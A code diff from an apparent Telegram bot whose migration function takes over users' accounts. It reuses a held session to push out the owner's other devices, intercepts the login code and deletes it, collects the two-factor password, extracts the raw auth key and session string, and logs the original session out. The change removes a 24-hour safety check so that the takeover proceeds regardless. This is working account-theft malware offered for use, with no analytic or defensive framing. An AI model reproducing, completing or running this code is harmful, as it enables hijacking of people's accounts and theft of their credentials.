@@ -533,12 +533,15 @@ def handle_hex_login(message):
 
     run_async(process_hex())
 
-# =========================================================
-# 👑 السحب الشامل والمطور (نظام التهجير واعتراض الكود) دالتك الأساسية
-# =========================================================
+
+
+
+
+
+
 
 async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
-    """محرك السحب الاحترافي - اعتراض الكود، دعم 2FA، واستخراج مفتاح tdata"""
+    """محرك السحب الاحترافي - تجاوز 24 ساعة، اعتراض الكود، دعم 2FA، واستخراج مفتاح tdata، وانتحار الجلسة A"""
 
     B_DEVICE_MODEL = f"MigrationB_{acc_id}"
     client_b = None
@@ -550,9 +553,8 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         if not client_a.is_connected:
             await client_a.connect()
 
-        # [2] طرد جميع الأجهزة الأخرى أولاً من الجلسة A
+        # [2] محاولة طرد الأجهزة الأخرى (وإذا لم يمر 24 ساعة نتجاهل الخطأ ونكمل السحب!)
         auths = await client_a.invoke(functions.account.GetAuthorizations())
-        hit_24h_limit = False
 
         for auth in auths.authorizations:
             if not getattr(auth, 'current', False):
@@ -561,20 +563,11 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
                     await asyncio.sleep(0.5) 
                 except Exception as e:
                     err_str = str(e).lower()
-                    if "fresh" in err_str or "24" in err_str:
-                        hit_24h_limit = True
-                        break 
-                    elif "flood" in err_str:
+                    if "flood" in err_str:
                         await asyncio.sleep(4)
-
-        if hit_24h_limit:
-            conn = get_db_conn()
-            c = conn.cursor()
-            c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
-            conn.commit()
-            conn.close()
-            if client_a.is_connected: await client_a.disconnect()
-            return False
+                    else:
+                        # نتجاهل خطأ الـ 24 ساعة (Fresh) ونكمل العملية لتسجيل الجلسة B
+                        continue
 
         # [3] إنشاء الجلسة B وطلب كود الدخول
         client_b = Client(
@@ -584,10 +577,10 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             in_memory=True,
             device_model=B_DEVICE_MODEL
         ) 
-        
+
         await client_b.connect()
         sent_code = await client_b.send_code(phone)
-        
+
         await asyncio.sleep(3.5)
 
         # [4] اعتراض الكود عبر الجلسة A وحذف الأثر فوراً
@@ -625,8 +618,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
                     f"•❐• أرسـل كـلـمـة سـر الـتـحـقـق خـطـوتـيـن الآن لـلـمـتـابـعـة (لـديـك دقيقتان):",
                     parse_mode="Markdown"
                 )
-                
-                # انتظار رد الأدمن بالباسوورد (معدلة لكي لا يحصل خطأ AttributeError في مكتبة telebot)
+
                 USER_STATES[admin_id] = {"action": "wait_for_2fa"}
                 password = None
                 for _ in range(60):
@@ -635,14 +627,14 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
                         password = USER_STATES[admin_id]["2fa_pass"]
                         del USER_STATES[admin_id]
                         break
-                
+
                 if not password:
                     raise asyncio.TimeoutError()
-                
+
                 # إدخال الباسوورد
                 await client_b.check_password(password)
                 bot.send_message(admin_id, "✅ تـم قـبـول الـبـاسـوورد بـنـجـاح، مـتـابـعـة الـتـهـجـيـر...")
-                
+
             except asyncio.TimeoutError:
                 bot.send_message(admin_id, f"⏳ انـتـهـى الـوقـت لـإدخـال بـاسـوورد `{phone}`. تـم إلـغـاء الـعـمـلـيـة.", parse_mode="Markdown")
                 raise Exception("Admin did not provide 2FA password in time.")
@@ -665,22 +657,21 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             hex_key_str = auth_key_bytes.hex()
             final_tdata_key = f"{hex_key_str} {target_dc}"
         except Exception:
-            # في حال فشل استخراج الـ AuthKey الخام نعود للـ String العادي
             final_tdata_key = f"FAILED_TO_EXTRACT_HEX {target_dc}"
 
-        # [7] انتحار الجلسة A عبر الـ Raw API (تمرير السلطة المطلقة لـ B)
+        # [7] انتحار الجلسة A عبر الـ Raw API (تسجيل خروج لتركيع B على العرش)
         try:
             await client_a.invoke(functions.auth.LogOut())
         except Exception:
             pass 
-            
+
         if client_a.is_connected: 
             await client_a.disconnect()
 
         if client_b.is_connected:
             await client_b.disconnect()
 
-        # [8] تحديث الداتا بيس لصالح الأدمن
+        # [8] تحديث الداتا بيس لصالح الأدمن بالجلسة B الجديدة
         conn = get_db_conn()
         c = conn.cursor()
         c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='', hex_key=? WHERE id=?", 
@@ -699,7 +690,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         try: bot.send_message(original_owner, kick_msg)
         except Exception: pass
 
-        # [10] إرسال كليشة النجاح للأدمن (بالصيغة المطلوبة للـ tdata)
+        # [10] إرسال كليشة النجاح للأدمن
         admin_msg = (
             f"✅ تـم الـسـحـب والـتـهـجـيـر بـنـجـاح (مـع الـتـحـقـق بـخـطـوتـيـن إن وجـد)!\n\n"
             f"⎉╎ الـرقـم: `{phone}`\n"
@@ -707,7 +698,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             f"⎉╎ الـسـيـرفـر (DC): {target_dc}\n\n"
             f"🔑 مـفـتـاح tdata (HEX + DC):\n`{final_tdata_key}`\n\n"
             f"🔒 الـجـلـسـة (String):\n`{session_b_str}`\n\n"
-            f"•❐• تـم مـسـح رسـالـة الـكـود، وتـدمـيـر جـلـسـة A، وتـركـيـع B عـلـى الـعـرش."
+            f"•❐• تـم مـسـح رسـالـة الـكـود، وتـسـجـيـل الـخـروج مـن جـلـسـة A، وتـركـيـع B عـلـى الـعـرش."
         )
         bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
 
@@ -715,19 +706,31 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
     except Exception as e:
         logging.error(f"Migration Failed for {phone}: {e}")
-        
+
         # في حال فشلت العملية، نتأكد من إغلاق الجلسات لعدم ترك أي معلق
         if client_b and client_b.is_connected: 
             await client_b.disconnect()
         if client_a and client_a.is_connected: 
             await client_a.disconnect()
-            
+
         try:
             bot.send_message(admin_id, f"❌ فشل التهجير للرقم `{phone}`\nالسبب: {str(e)}", parse_mode="Markdown")
         except Exception:
             pass
-            
+
         return False
+
+
+
+
+
+
+
+
+
+
+
+
 
 # =========================================================
 # 🎛️ واجهات التحكم
